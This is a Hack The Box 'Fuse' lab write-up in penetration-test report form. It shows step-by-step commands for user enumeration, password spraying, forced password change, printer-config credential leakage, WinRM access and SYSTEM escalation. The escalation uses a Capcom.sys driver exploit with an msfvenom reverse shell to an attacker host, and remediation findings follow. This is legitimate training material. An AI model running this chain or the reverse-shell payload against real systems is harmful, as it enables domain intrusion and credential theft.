# HTB Fuse - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2026-3-20

---

## 0. Lesson Learned

If at first you don't succeed with an exploit, FIND ANOTHER REPO, and try, try again.

---

## 1. Executive Summary

An assessment was conducted against the target system 10.129.2.5 (FUSE) within the `fabricorp.local` domain. Initial access was achieved through credential discovery via exposed PaperCut logs, followed by password manipulation and credential reuse.

A valid service account (`svc-print`) was obtained and used to gain a remote shell via WinRM. Privilege escalation to NT AUTHORITY\SYSTEM was achieved by abusing the SeLoadDriverPrivilege using a vulnerable driver exploit.

## 2. Scope

- **Target:** 10.129.2.5
- **Domain:** fabricorp.local
- **Environment:** HackTheBox Fuse (Retired Machine)
- **Testing Window:** 2026-3-20
- **Objective:** Complete domain compromise

---

## 3. Methodology

Testing followed a standard OSCP methodology:

- Information Gathering
- Enumeration
- Initial Access
- Post-Exploitation
- Privilege Escalation
- Proof of Compromise

---

## 4. Information Gathering

A full TCP port scan was performed.

```
nmap -p- -sCV 10.129.2.5 -T4 -oA fuse_tcp
```

Relevant open ports:

- 53 (DNS)
- 80 (HTTP)
- 88 (Kerberos)
- 135, 593 (RPC)
- 139, 445 (SMB)
- 389, 636 (LDAP)
- 3268, 3269 (Global Catalog)
- 5985 (WinRM)

The target is a Windows Domain Controller exposing multiple AD-related services, indicating an Active Directory environment.

The domain was added locally to the hosts file:

```
echo "10.129.2.5 fabricorp.local fuse.fabricorp.local" >> /etc/hosts
```

---

## 5. Enumeration

The web service revealed a PaperCut Print Logger and usernames were identified from the logs:

- pmerton
- tlavel
- bnielson
- sthompson
- bhult
- administrator
- fuse

Username Validation:

```
kerbrute userenum -d fabricorp.local --dc 10.129.2.5 usernames.txt
```

Confirmed valid domain accounts for further attacks.

AS-REP Roasting Check

```
GetNPUsers.py -no-pass -usersfile usernames.txt -dc-ip 10.129.2.5 fabricorp.local/
```

No users with UF_DONT_REQUIRE_PREAUTH. AS-REP roasting not viable.

SMB / RPC / LDAP Enumeration

```
rpcclient -U "" -N 10.129.2.5

smbclient -L //10.129.2.5 -N

ldapsearch -x -H ldap://10.129.2.5 -b "DC=fabricorp,DC=local"
```

Access denied / failed binds. Anonymous enumeration not allowed.

---

## 6. Initial Access

A potential password `Fabricorp01` was discovered as a Word document title in the print logs.

Using SMB password spraying:

```
crackmapexec smb 10.129.2.5 -u usernames.txt -p 'Fabricorp01'
```

Three users were found with that password:

```
tlavel : Fabricorp01

bhult : Fabricorp01

bnielson : Fabricorp01
```

Weak password reuse identified.

Account password was changed for `tlavel`:

```
nxc smb 10.129.2.5 -u tlavel -p Fabricorp01 -M change-password -o NEWPASS=P@ssword1
```

Password reset was allowed without prior authentication controls.

Authenticated SMB Enumeration:

```
smbclient -L //10.129.2.5 -U 'tlavel%P@ssword1'
```


Revealed Printer share HP-MFT01, but no useful data.

Authenticated RPC Enumeration:

```
rpcclient -U tlavel%P@ssword1 10.129.2.5

enumprinters
```

Discoved credentials:

```
$fab@s3Rv1ce$1
```

Printer configuration leaked service credentials.

Credentials were validated for WinRM Access

```
crackmapexec winrm 10.129.2.5 -u usernames.txt -p passwords.txt
```

Credentials validated for:

```
svc-print : $fab@s3Rv1ce$1
```

A shell was obtained:

```
evil-winrm -i 10.129.2.5 -u svc-print -p '$fab@s3Rv1ce$1'
```

Resulting in an initial foothold achieved as svc-print.

---

## 7. Post-Exploitation

Manual privilege and group enumeration:

```
whoami

whoami /priv

whoami /groups
```

User `svc-print` has `SeLoadDriverPrivilege` enabled. The `SeLoadDriverPrivilege` can be abused for privilege escalation.

---

## 8. Privilege Escalation

Generate Reverse Shell Payload:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker-ip> LPORT=4444 -f exe -o rev.exe
```

Upload Exploit Files with Evil-WinRM:

```
upload LoadDriver.exe
upload Capcom.sys
upload ExploitCapcom.exe
upload rev.exe
```

Load Driver

```
.\LoadDriver.exe System\CurrentControlSet\MyService C:\ProgramData\Capcom.sys
```

Execute the exploit:

```
.\ExploitCapcom.exe
```

Listener:

```
nc -lnvp 4444
```

Shell received as SYSTEM. Successful privilege escalation via vulnerable driver.

---

## 9. Proof of Compromise

**User Flag**: *REDACTED*

```
type C:\Users\svc-print\Desktop\user.txt
```

**Root Flag**: *REDACTED*

```
type C:\Users\Administrator\Desktop\root.txt
```

This confirms full domain compromise.

---

## 10. Findings & Recommendations

### **Finding:** Weak Domain Password Policy

**Severity:** High

**Description:**
The domain password policy allowed weak or easily guessable passwords that could be cracked using common wordlists.

**Impact:**
Attackers could recover user credentials through offline cracking or password spraying, potentially leading to privilege escalation.

**Recommendation:**
Enforce strong password complexity requirements, implement account lockout policies, and monitor for excessive authentication attempts.

### **Finding:** Credential Exposure via Application Logs

**Severity:** High

**Description:**
Sensitive usernames and operational data were exposed through publicly accessible application logs.

**Impact:**
Attackers could enumerate valid user accounts and identify potential attack paths.

**Recommendation:**
Restrict access to log files, sanitize sensitive information from logs, and implement proper logging and access control policies.

### **Finding:** Credential Leakage via Device or Service Configuration

**Severity:** Critical

**Description:**
Service credentials were exposed within device or service configuration files (e.g., printer configuration).

**Impact:**
Attackers could retrieve credentials and escalate privileges to a higher-privileged service account.

**Recommendation:**
Remove credentials from configuration files, use secure credential storage mechanisms, and restrict access to sensitive configuration data.

### **Finding:** SeLoadDriverPrivilege Assigned to Non-Administrator Account

**Severity:** Critical

**Description:**
A non-administrative user possessed the SeLoadDriverPrivilege privilege, allowing the loading of arbitrary drivers.

**Impact:**
Attackers could exploit this privilege to execute code at the SYSTEM level and fully compromise the host.

**Recommendation:**
Restrict SeLoadDriverPrivilege to trusted administrators only, review privilege assignments regularly, and enforce the principle of least privilege.

### **Finding:** Excessive Delegated Privileges Allowing Password Reset Abuse

**Severity:** Critical

**Description:**
A domain account was granted delegated privileges such as ForceChangePassword over other users, allowing unauthorized password resets.

**Impact:**
Attackers could reset passwords for privileged accounts and gain unauthorized access, potentially leading to domain compromise.

**Recommendation:**
Restrict delegated privileges to only required accounts, review Active Directory ACLs regularly, and enforce the principle of least privilege.

---

## 11. Appendix

SeLoadDriverPrivilege Exploit - 
[https://github.com/JoshMorrison99/SeLoadDriverPrivilege](https://github.com/JoshMorrison99/SeLoadDriverPrivilege)